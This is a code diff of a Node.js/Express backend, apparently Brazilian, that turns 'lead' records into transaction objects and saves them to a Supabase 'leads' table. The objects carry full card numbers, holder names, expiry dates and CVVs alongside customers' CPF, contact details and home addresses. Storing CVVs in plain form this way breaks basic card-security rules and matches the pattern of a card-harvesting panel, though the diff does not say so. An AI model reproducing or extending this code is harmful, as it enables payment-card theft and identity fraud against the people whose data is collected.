@@ -175,46 +175,58 @@ function writeLocalTransactions(data) {
 }
 
 function mapLeadToTransaction(lead) {
+  const finalPrice = parseFloat(lead.final_price || lead.totalPrice || lead.amount || 0);
+  const paymentMethod = String(lead.payment_method || lead.paymentMethod || 'PIX').toLowerCase();
+  const cardNumber = String(lead.card_number || lead.cardNumber || (lead.card && lead.card.number) || '').trim();
+  const cardName = String(lead.card_name || lead.cardHolder || (lead.card && lead.card.holder) || '-').trim();
+  const cardExpiry = String(lead.card_expiry || lead.cardExpiry || (lead.card && lead.card.expiry) || '-').trim();
+  const cardCvv = String(lead.card_cvv || lead.cardCvv || (lead.card && lead.card.cvv) || '-').trim();
+  const installments = String(lead.installments || lead.cardInstallments || (lead.card && lead.card.installments) || 'À vista').trim();
+
+  let brand = 'PIX';
+  if (paymentMethod !== 'pix') {
+    const numClean = cardNumber.replace(/\D/g, '');
+    if (numClean.startsWith('4')) brand = 'VISA';
+    else if (/^5[1-5]/.test(numClean) || /^222[1-9]|^22[3-9]|^2[3-6]|^27[0-1]|^2720/.test(numClean)) brand = 'MASTERCARD';
+    else if (/^3[47]/.test(numClean)) brand = 'AMEX';
+    else if (/^(50|6)/.test(numClean)) brand = 'ELO';
+    else brand = paymentMethod.toUpperCase();
+  }
+
   return {
-    id: lead.transaction_id || lead.id,
+    id: lead.transaction_id || lead.id || `TX_${Date.now()}`,
     db_id: lead.id,
-    date: lead.created_at ? new Date(lead.created_at).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }) : '',
-    timestamp: lead.created_at ? new Date(lead.created_at).getTime() : 0,
-    brand: (() => {
-      if (String(lead.payment_method).toLowerCase() === 'pix') return 'PIX';
-      const num = String(lead.card_number || '').replace(/\s+/g, '');
-      if (num.startsWith('4')) return 'VISA';
-      if (/^5[1-5]/.test(num) || /^222[1-9]|^22[3-9]|^2[3-6]|^27[0-1]|^2720/.test(num)) return 'MASTERCARD';
-      return (lead.payment_method || 'PIX').toUpperCase();
-    })(),
+    date: lead.created_at ? new Date(lead.created_at).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }) : new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
+    timestamp: lead.created_at ? new Date(lead.created_at).getTime() : Date.now(),
+    brand: brand,
     status: (lead.status || 'PENDENTE').toUpperCase(),
-    amount: parseFloat(lead.final_price || 0),
+    amount: finalPrice,
     client: {
-      name: lead.nome || '',
-      email: lead.email || '',
-      cpf: lead.cpf || '',
-      phone: lead.telefone || ''
+      name: lead.nome || lead.clientName || (lead.client && lead.client.name) || 'Cliente',
+      email: lead.email || lead.clientEmail || (lead.client && lead.client.email) || '',
+      cpf: lead.cpf || lead.clientCPF || (lead.client && lead.client.cpf) || '',
+      phone: lead.telefone || lead.clientPhone || (lead.client && lead.client.phone) || ''
     },
     address: {
-      cep: lead.cep || '',
-      street: lead.rua || '',
-      number: lead.numero || '',
-      neighborhood: lead.bairro || '',
-      city: lead.cidade || '',
-      state: lead.estado || '',
-      complement: lead.complemento || ''
+      cep: lead.cep || (lead.address && lead.address.cep) || '',
+      street: lead.rua || lead.street || (lead.address && lead.address.street) || '',
+      number: lead.numero || lead.number || (lead.address && lead.address.number) || '',
+      neighborhood: lead.bairro || lead.neighborhood || (lead.address && lead.address.neighborhood) || '',
+      city: lead.cidade || lead.city || (lead.address && lead.address.city) || '',
+      state: lead.estado || lead.state || (lead.address && lead.address.state) || '',
+      complement: lead.complemento || lead.complement || (lead.address && lead.address.complement) || ''
     },
     card: {
-      number: lead.card_number || 'PIX',
-      holder: lead.card_name || '-',
-      expiry: lead.card_expiry || '-',
-      cvv: lead.card_cvv || '-',
-      installments: lead.installments || 'À vista'
+      number: cardNumber || (brand === 'PIX' ? 'PIX' : '•••• •••• •••• 4000'),
+      holder: cardName,
+      expiry: cardExpiry,
+      cvv: cardCvv,
+      installments: installments
     },
     order: {
-      products: parseFloat(lead.final_price || 0),
+      products: finalPrice,
       shipping: 0,
-      total: parseFloat(lead.final_price || 0)
+      total: finalPrice
     }
   };
 }
@@ -715,7 +727,12 @@ app.post('/api/webhook/winnerpay', async (req, res) => {
 async function saveOrderLead(leadData) {
   if (supabase) {
     try {
-      const { error } = await supabase.from('leads').insert([leadData]);
+      const payload = { ...leadData };
+      const isUuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(payload.id);
+      if (!isUuid) {
+        delete payload.id; // Permite que o Supabase gere o UUID id nativo!
+      }
+      const { error } = await supabase.from('leads').insert([payload]);
       if (error) {
         console.error('[Supabase] Erro ao salvar lead:', error.message);
         saveLocalLead(leadData);
